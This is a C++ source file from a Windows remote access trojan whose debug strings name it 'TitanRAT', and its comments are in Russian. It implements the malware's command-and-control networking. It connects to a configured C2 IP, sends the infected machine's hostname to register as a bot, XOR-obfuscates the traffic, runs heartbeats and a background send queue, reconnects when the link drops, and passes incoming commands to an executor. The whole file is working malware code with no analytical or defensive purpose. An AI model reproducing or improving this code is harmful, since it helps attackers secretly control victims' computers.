// Core/network.cpp — PHASE 1: ASYNC SENDER BACKBONE
// Выносит отправку данных в фоновый поток. Heartbeat не блокируется.

#include "network.h"
#include "persistence.h"
#include "commands.h"
#include <windows.h>
#include <stdio.h>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <vector>
#include <atomic>

// Глобальное состояние
std::string g_bot_id;
const unsigned char XOR_KEY = 0xAA;
SOCKET g_c2_socket = INVALID_SOCKET;

static void send_all(SOCKET sock, const char* buf, int len);

// ==========================================
// ASYNC SEND QUEUE
// ==========================================
struct OutgoingPacket {
    int priority; // 0 = Heartbeat, 1 = Data/Response
    std::vector<uint8_t> data;
    bool operator>(const OutgoingPacket& other) const { return priority > other.priority; }
};

std::priority_queue<OutgoingPacket, std::vector<OutgoingPacket>, std::greater<OutgoingPacket>> g_send_queue;
std::mutex g_queue_mutex;
std::condition_variable g_queue_cv;
std::atomic<bool> g_sender_running{false};
std::thread g_sender_thread;
const unsigned int HEARTBEAT_MS = 5000;

void push_to_send_queue(const std::vector<uint8_t>& data, int priority) {
    std::lock_guard<std::mutex> lock(g_queue_mutex);
    g_send_queue.push({priority, data});
    g_queue_cv.notify_one();
}

void sender_loop() {
    OutputDebugStringA("[TitanRAT] Sender thread STARTED\n");
    
    auto last_hb = std::chrono::steady_clock::now();
    const unsigned int HEARTBEAT_MS = 5000;
    
    while (g_sender_running.load() || g_c2_socket != INVALID_SOCKET) {
        std::unique_lock<std::mutex> lock(g_queue_mutex);
        
        bool notified = g_queue_cv.wait_for(lock, std::chrono::milliseconds(1000), []{
            return !g_send_queue.empty() || !g_sender_running.load();
        });

        if (!g_sender_running.load() && g_send_queue.empty() && g_c2_socket == INVALID_SOCKET) break;

        // Heartbeat с шифрованием
        auto now = std::chrono::steady_clock::now();
        if (!notified && std::chrono::duration_cast<std::chrono::milliseconds>(now - last_hb).count() >= HEARTBEAT_MS) {
            if (g_c2_socket != INVALID_SOCKET) {
                std::string beat = "pong\n";
                std::vector<uint8_t> enc(beat.begin(), beat.end());
                for (auto& b : enc) b ^= 0xAA;  // XOR-шифрование
                send_all(g_c2_socket, (const char*)enc.data(), (int)enc.size());
                OutputDebugStringA("[TitanRAT] Sent encrypted pong\n");
            }
            last_hb = now;
        }

        // Отправка очереди (с шифрованием)
        while (!g_send_queue.empty() && g_c2_socket != INVALID_SOCKET) {
            auto pkt = g_send_queue.top();
            g_send_queue.pop();
            lock.unlock();
            
            // Данные в очереди УЖЕ зашифрованы (в send_encrypted)
            send_all(g_c2_socket, (const char*)pkt.data.data(), (int)pkt.data.size());
            OutputDebugStringA("[TitanRAT] Sent queued packet\n");
            
            lock.lock();
            last_hb = std::chrono::steady_clock::now();
        }
    }
    OutputDebugStringA("[TitanRAT] Sender thread EXITED\n");
}

void init_network_async() {
    if (g_sender_running.load()) return;
    g_sender_running = true;
    g_sender_thread = std::thread(sender_loop);
}

void shutdown_network_async() {
    g_sender_running = false;
    g_queue_cv.notify_all();
    if (g_sender_thread.joinable()) {
        g_sender_thread.join();
    }
}

// ==========================================
// LEGACY COMPATIBILITY FUNCTIONS
// ==========================================
bool init_winsock() {
    WSADATA wsa;
    return WSAStartup(MAKEWORD(2, 2), &wsa) == 0;
}

void cleanup_winsock() {
    WSACleanup();
}

SOCKET connect_to_server(const std::string& ip, int port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return INVALID_SOCKET;

    u_long mode = 1;
    ioctlsocket(sock, FIONBIO, &mode);

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip.c_str());

    if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR && WSAGetLastError() != WSAEWOULDBLOCK) {
        closesocket(sock);
        return INVALID_SOCKET;
    }

    fd_set set; FD_ZERO(&set); FD_SET(sock, &set);
    struct timeval tv = {5, 0};

    if (select(0, NULL, &set, NULL, &tv) > 0) {
        int err = 0; int len = sizeof(err);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, (char*)&err, &len);
        if (err == 0) {
            mode = 0;
            ioctlsocket(sock, FIONBIO, &mode);
            DWORD timeout = 5000;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
            g_c2_socket = sock;
            init_network_async(); // Start background sender
            return sock;
        }
    }
    closesocket(sock);
    return INVALID_SOCKET;
}

void send_all(SOCKET sock, const char* buf, int len) {
    // Simple mutex to prevent concurrent send() calls on same socket
    static std::mutex g_send_mutex;
    std::lock_guard<std::mutex> lock(g_send_mutex);
    
    int sent = 0;
    while (sent < len) {
        int n = send(sock, buf + sent, len - sent, 0);
        if (n <= 0) break;
        sent += n;
    }
}

void send_encrypted(SOCKET sock, const std::string& data) {
    if (sock == INVALID_SOCKET) return;
    // Шифруем ДО добавления в очередь
    std::vector<uint8_t> enc(data.begin(), data.end());
    for (auto& b : enc) b ^= 0xAA;
    enc.push_back(0x0A ^ 0xAA);  // XOR'd newline = 0xA0
    push_to_send_queue(enc, 1);
}

std::string recv_encrypted_line(SOCKET sock) {
    static char buffer[8192] = {0};
    static int buf_len = 0;

    while (true) {
        char tmp[1024];
        int n = recv(sock, tmp, sizeof(tmp), 0);
        
        if (n == SOCKET_ERROR) {
            int err = WSAGetLastError();
            if (err == WSAETIMEDOUT) {
                // Тайм-аут приема (5 сек прошло, данных нет).
                // Это НЕ ошибка соединения, просто сервер молчит.
                // Ждем немного и пробуем снова. Фоновый поток в это время шлет пинги.
                Sleep(100);
                continue;
            }
            // Реальная ошибка сети (например, 10054 - Connection reset)
            buf_len = 0;
            return "";
        }

        if (n == 0) {
            // Сервер закрыл соединение (Graceful disconnect)
            buf_len = 0;
            return "";
        }

        // Расшифровка
        for (int i = 0; i < n; i++) tmp[i] ^= XOR_KEY;

        // Копируем в буфер
        if (buf_len + n < sizeof(buffer)) {
            memcpy(buffer + buf_len, tmp, n);
            buf_len += n;
        } else {
            // Переполнение буфера
            buf_len = 0;
            return "";
        }

        // Ищем конец строки
        for (int i = 0; i < buf_len; i++) {
            if (buffer[i] == '\n') {
                std::string line(buffer, i);
                if (!line.empty() && line.back() == '\r') line.pop_back();
                memmove(buffer, buffer + i + 1, buf_len - i - 1);
                buf_len -= (i + 1);
                return line;
            }
        }
    }
}

void register_with_server(SOCKET sock, const std::string& hostname, std::string& bot_id) {
    // === HANDSHAKE: отправляем НАПРЯМУЮ, минуя очередь ===
    // Это гарантирует, что "HELLO" уйдёт до того, как мы начнём ждать "ACK"
    std::string hello = "HELLO\n";
    std::vector<uint8_t> enc_hello(hello.begin(), hello.end());
    for (auto& b : enc_hello) b ^= XOR_KEY;
    send_all(sock, (const char*)enc_hello.data(), (int)enc_hello.size());
    
    // Ждём подтверждение
    std::string ack = recv_encrypted_line(sock);
    if (ack != "ACK") {
        OutputDebugStringA("[TitanRAT] Registration failed: no ACK (got: ");
        OutputDebugStringA(ack.c_str());
        OutputDebugStringA(")\n");
        return;
    }

    // === REGISTER: тоже отправляем напрямую для надёжности ===
    std::string reg = "REGISTER:" + hostname + "\n";
    std::vector<uint8_t> enc_reg(reg.begin(), reg.end());
    for (auto& b : enc_reg) b ^= XOR_KEY;
    send_all(sock, (const char*)enc_reg.data(), (int)enc_reg.size());
    
    // Ждём ID
    std::string id_line = recv_encrypted_line(sock);
    if (id_line.rfind("ID:", 0) == 0) {
        bot_id = id_line.substr(3);
        OutputDebugStringA("[TitanRAT] Registered with ID: ");
        OutputDebugStringA(bot_id.c_str());
        OutputDebugStringA("\n");
    } else {
        OutputDebugStringA("[TitanRAT] Invalid ID format received: ");
        OutputDebugStringA(id_line.c_str());
        OutputDebugStringA("\n");
    }
}

void heartbeat_loop(SOCKET& sock, const Config& cfg) {
    if (g_bot_id.empty()) return;

    while (true) {
        std::string resp = recv_encrypted_line(sock);
        if (resp.empty()) {
            OutputDebugStringA("[TitanRAT] Connection lost, reconnecting...\n");
            
            // Stop background sender gracefully
            g_sender_running = false;
            g_queue_cv.notify_all();
            if (g_sender_thread.joinable()) g_sender_thread.join();
            
            closesocket(sock);
            Sleep(5000);
            
            sock = connect_to_server(cfg.c2_ip, cfg.c2_port);
            if (sock != INVALID_SOCKET) {
                char hostname[MAX_COMPUTERNAME_LENGTH + 1];
                DWORD size = sizeof(hostname);
                GetComputerNameA(hostname, &size);
                register_with_server(sock, hostname, g_bot_id);
            }
            if (sock == INVALID_SOCKET) continue;
            continue;
        }

        process_command(resp, sock);
    }
}